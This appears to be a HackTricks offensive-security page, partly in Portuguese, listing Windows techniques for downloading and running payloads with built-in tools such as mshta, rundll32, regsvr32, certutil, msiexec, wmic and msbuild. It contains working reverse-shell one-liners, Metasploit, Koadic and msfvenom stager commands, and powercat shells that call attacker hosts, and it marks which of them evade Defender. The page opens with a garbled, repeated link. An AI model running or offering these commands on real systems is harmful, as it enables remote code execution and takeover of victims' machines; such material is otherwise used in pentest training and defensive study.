- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
Processo realizando chamada de rede: **mshta.exe**\
Carga gravada no disco: **cache local do IE**
```bash
mshta http://webserver/payload.hta
```
Processo realizando chamada de rede: **mshta.exe**\
Carga gravada no disco: **cache local do IE**
```bash
mshta \\webdavserver\folder\payload.hta
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

#### **Exemplo de shell reverso hta-psh (usa hta para baixar e executar backdoor PS)**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Você pode baixar e executar facilmente um zombie Koadic usando o stager hta**

#### Exemplo hta
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

O comando `mshta` é uma ferramenta do Windows que permite executar arquivos HTML como aplicativos. Essa funcionalidade pode ser explorada para executar scripts maliciosos em um alvo. 

Uma técnica comum é usar um arquivo de script `.sct` para executar comandos maliciosos. O arquivo `.sct` é um arquivo de script do Windows que pode ser executado pelo `mshta`. 

Para usar essa técnica, primeiro é necessário criar um arquivo `.sct` contendo o código malicioso. Em seguida, o comando `mshta` é usado para executar o arquivo `.sct`. 

Aqui está um exemplo de como usar o `mshta` com um arquivo `.sct`:

```
mshta http://attacker.com/malicious.sct
```

Nesse exemplo, o `mshta` é usado para abrir o arquivo `.sct` hospedado em `http://attacker.com/malicious.sct`. O código malicioso contido no arquivo `.sct` será executado no alvo. 

Essa técnica pode ser usada para realizar várias atividades maliciosas, como execução remota de código, download e execução de arquivos maliciosos, entre outros. É importante ressaltar que essa técnica pode ser detectada por soluções de segurança, portanto, é necessário tomar medidas adicionais para evitar a detecção.
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a Microsoft HTML Application Host that allows you to execute HTML applications (.hta files) on Windows systems. It is a legitimate Windows component that can be abused by attackers to execute malicious code.

Metasploit, a popular penetration testing framework, provides a module called `exploit/windows/browser/mshta` that exploits the Mshta vulnerability. This module generates a malicious .hta file and delivers it to the target system. When the file is executed, it runs the specified payload, giving the attacker remote access to the system.

To use the `exploit/windows/browser/mshta` module, follow these steps:

1. Set the `RHOST` option to the IP address of the target system.
2. Set the `PAYLOAD` option to the desired payload.
3. Set the `LHOST` option to the IP address of the attacking machine.
4. Run the exploit.

Once the exploit is successful, the attacker will have a Meterpreter session, which provides a powerful interface to interact with the compromised system.

It is important to note that using Metasploit for unauthorized access to systems is illegal and unethical. This information is provided for educational purposes only.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Detectado pelo defensor**

## **Rundll32**

[**Exemplo de DLL hello world**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
Processo realizando chamada de rede: **rundll32.exe**\
Carga gravada no disco: **cache local do IE**

**Detectado pelo defensor**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

O comando `rundll32` é uma ferramenta do Windows que permite executar funções em bibliotecas de vínculo dinâmico (DLLs). No contexto do Metasploit, podemos usar o `rundll32` para carregar uma DLL maliciosa e executar um payload.

Aqui está um exemplo de como usar o `rundll32` com o Metasploit:

1. Crie um payload do Metasploit usando o msfvenom:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f dll > payload.dll
```

2. Inicie um listener do Metasploit para receber a conexão reversa:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <seu endereço IP>
set LPORT <sua porta>
exploit
```

3. No computador de destino, execute o seguinte comando para carregar a DLL maliciosa e executar o payload:

```
rundll32 payload.dll, <nome da função>
```

Certifique-se de substituir `<nome da função>` pelo nome da função exportada pela DLL maliciosa.

O `rundll32` é uma ferramenta poderosa que pode ser usada para executar payloads maliciosos no Windows. No entanto, é importante lembrar que o uso indevido dessa ferramenta é ilegal e pode resultar em consequências legais graves. Portanto, sempre use essas técnicas apenas para fins educacionais e com permissão adequada.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by hackers to load malicious DLLs and execute their code. Koadic is a post-exploitation tool that utilizes the Rundll32 technique to establish a command and control channel on a compromised Windows machine.

To use Rundll32 with Koadic, follow these steps:

1. Generate a payload using Koadic. This payload will be a DLL file containing the malicious code you want to execute on the target machine.

2. Transfer the generated payload to the target machine. This can be done using various methods such as email, USB drives, or exploiting vulnerabilities in other software.

3. Open a command prompt on the target machine and run the following command to execute the payload using Rundll32:

```
rundll32.exe <path_to_payload.dll>,<entry_point_function>
```

Replace `<path_to_payload.dll>` with the path to the transferred payload DLL file, and `<entry_point_function>` with the name of the function within the DLL that you want to execute.

4. Once the payload is executed, Koadic will establish a command and control channel, allowing you to remotely control the compromised machine and perform various post-exploitation activities.

It is important to note that the Rundll32 technique can be detected by antivirus software, so it is crucial to use evasion techniques to bypass detection. Additionally, this technique requires initial access to the target machine, either through a vulnerability or social engineering.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

O comando `regsvr32` é uma ferramenta do Windows que permite registrar e desregistrar bibliotecas de vínculo dinâmico (DLLs) e controles ActiveX no sistema operacional. Essa ferramenta é comumente usada por hackers para executar código malicioso em um sistema comprometido.

### Uso básico

Para registrar uma DLL usando o `regsvr32`, você pode usar o seguinte comando:

```
regsvr32 <caminho_para_dll>
```

Para desregistrar uma DLL, você pode usar o seguinte comando:

```
regsvr32 /u <caminho_para_dll>
```

### Uso malicioso

Os hackers podem explorar o `regsvr32` para executar código malicioso no sistema comprometido. Eles podem criar uma DLL maliciosa e registrá-la usando o comando `regsvr32`. Quando a DLL é registrada, o código malicioso é executado automaticamente sempre que o sistema é reiniciado.

### Detecção e prevenção

Para detectar atividades maliciosas relacionadas ao `regsvr32`, é importante monitorar o registro do sistema em busca de alterações suspeitas. Além disso, é recomendável manter o sistema operacional e os aplicativos atualizados para evitar vulnerabilidades conhecidas que possam ser exploradas por hackers.

Para prevenir o uso malicioso do `regsvr32`, é importante restringir o acesso ao comando e garantir que apenas usuários confiáveis tenham permissão para registrarem DLLs no sistema. Além disso, é recomendável utilizar soluções de segurança, como antivírus e firewalls, para detectar e bloquear atividades maliciosas.
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
Processo realizando chamada de rede: **regsvr32.exe**\
Carga gravada no disco: **cache local do IE**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

**Detectado pelo Defender**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

O comando `regsvr32` é uma ferramenta do Windows que permite registrar e desregistrar bibliotecas de vínculo dinâmico (DLLs) e controles ActiveX no sistema operacional. No entanto, essa ferramenta também pode ser explorada por hackers para executar código malicioso no sistema alvo.

O Metasploit Framework, uma das ferramentas mais populares para testes de penetração, possui um módulo chamado `exploit/windows/local/regsvr32_applocker_bypass` que aproveita uma vulnerabilidade no `regsvr32` para contornar as restrições do AppLocker e executar payloads arbitrários.

Esse módulo permite que um invasor execute comandos arbitrários no contexto do usuário atual, o que pode levar à execução remota de código e controle total do sistema comprometido.

Para usar esse módulo, é necessário ter acesso ao Metasploit Framework e conhecimento sobre como configurar e executar um payload específico.

Aqui está um exemplo de como usar o módulo `regsvr32` do Metasploit:

```
use exploit/windows/local/regsvr32_applocker_bypass
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <seu endereço IP>
set LPORT <sua porta>
exploit
```

Certifique-se de substituir `<seu endereço IP>` pelo seu endereço IP real e `<sua porta>` pela porta desejada para a conexão reversa.

Após a execução bem-sucedida do exploit, você terá acesso ao prompt do Meterpreter, que permite executar comandos no sistema alvo e explorar ainda mais a rede comprometida.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Você pode baixar e executar facilmente um zombie Koadic usando o stager regsvr**

## Certutil

Baixe um B64dll, decodifique-o e execute-o.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Baixe um arquivo B64exe, decodifique-o e execute-o.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Detectado pelo defensor**



<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando seus clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

O Cscript é uma ferramenta de linha de comando que permite a execução de scripts em linguagem VBScript. O Metasploit, por outro lado, é um framework de teste de penetração amplamente utilizado. Neste contexto, o Cscript pode ser usado em conjunto com o Metasploit para executar scripts VBScript maliciosos em sistemas Windows vulneráveis.

Para usar o Cscript com o Metasploit, siga as etapas abaixo:

1. Crie um script VBScript malicioso que execute a carga útil desejada. Por exemplo, um script que execute um shell reverso.

2. Abra o console do Metasploit e inicie o módulo `exploit/multi/script/web_delivery`.

3. Configure as opções necessárias, como o payload a ser entregue e o endereço IP do ouvinte.

4. Execute o módulo e aguarde a geração do script de entrega.

5. Copie o script gerado e cole-o em um arquivo de texto.

6. Salve o arquivo com a extensão `.vbs`.

7. No prompt de comando do Windows, navegue até o diretório onde o arquivo `.vbs` foi salvo.

8. Execute o script usando o comando `cscript nome_do_arquivo.vbs`.

9. Se tudo correr conforme o esperado, uma conexão reversa será estabelecida entre o sistema alvo e o atacante.

Lembre-se de que o uso de ferramentas e técnicas de hacking é estritamente regulamentado e só deve ser realizado com permissão legal e ética.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Detectado pelo defensor**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Detectado pelo defensor**

## **MSIExec**

Atacante
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Vítima:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Detectado**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
Processo realizando chamada de rede: **wmic.exe**\
Carga gravada no disco: **cache local do IE**

Exemplo de arquivo xsl:
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
Extraído [aqui](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

**Não detectado**

**Você pode baixar e executar facilmente um zombie Koadic usando o stager wmic**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

Você pode usar essa técnica para contornar a Lista Branca de Aplicativos e as restrições do Powershell.exe. Pois você será solicitado com um shell do PS.\
Basta baixar isso e executá-lo: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Não detectado**

## **CSC**

Compilar código C# na máquina da vítima.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Você pode baixar um shell reverso básico em C# aqui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Não detectado**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

**Eu não tentei**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

**Eu não tentei**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Shells do Powershell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Na pasta **Shells**, existem vários tipos de shells diferentes. Para baixar e executar o Invoke-_PowerShellTcp.ps1_, faça uma cópia do script e adicione ao final do arquivo:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Comece a servir o script em um servidor web e execute-o no dispositivo da vítima:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
O Defender ainda não detecta isso como código malicioso (ainda, 3/04/2019).

**TODO: Verificar outros shells do nishang**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Faça o download, inicie um servidor web, inicie o ouvinte e execute-o no computador da vítima:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
O Defender ainda não detecta isso como código malicioso (até o momento, 3/04/2019).

**Outras opções oferecidas pelo powercat:**

Shell de ligação, shell reverso (TCP, UDP, DNS), redirecionamento de porta, upload/download, gerar payloads, servir arquivos...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Crie um lançador do powershell, salve-o em um arquivo e faça o download e execute-o.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Detectado como código malicioso**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Crie uma versão em powershell de uma porta dos fundos do metasploit usando o unicorn
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Inicie o msfconsole com o recurso criado:
```
msfconsole -r unicorn.rc
```
Inicie um servidor web que sirva o arquivo _powershell\_attack.txt_ e execute no alvo:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Detectado como código malicioso**

## Mais

[PS>Attack](https://github.com/jaredhaight/PSAttack) Console PS com alguns módulos ofensivos PS pré-carregados (cifrado)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS com alguns módulos ofensivos PS e detecção de proxy (IEX)

## Bibliografia

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando os clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
